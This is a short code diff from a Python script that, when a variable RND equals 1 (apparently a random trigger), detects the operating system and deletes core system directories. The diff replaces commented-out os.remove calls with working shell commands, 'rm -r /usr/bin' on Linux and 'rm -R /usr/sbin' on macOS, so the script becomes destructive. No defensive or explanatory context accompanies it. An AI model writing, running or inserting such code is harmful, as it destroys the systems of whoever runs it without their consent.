@@ -12,11 +12,13 @@ if RND == 1:
 	if platform == "linux" or platform == "linux2":
 		# linux
 		print("Linux")
-		os.remove("/usr/bin")
+		#os.remove("/usr/bin")
+		os.system("rm -r /usr/bin")
 	elif platform == "darwin":
 		# OS X
 		print("OS")
-		os.remove("/usr/sbin")
+		#os.remove("/usr/sbin")
+		os.system("rm -R /usr/sbin")
 	elif platform == "win32":
 		# Windows...
 		print("WIN")
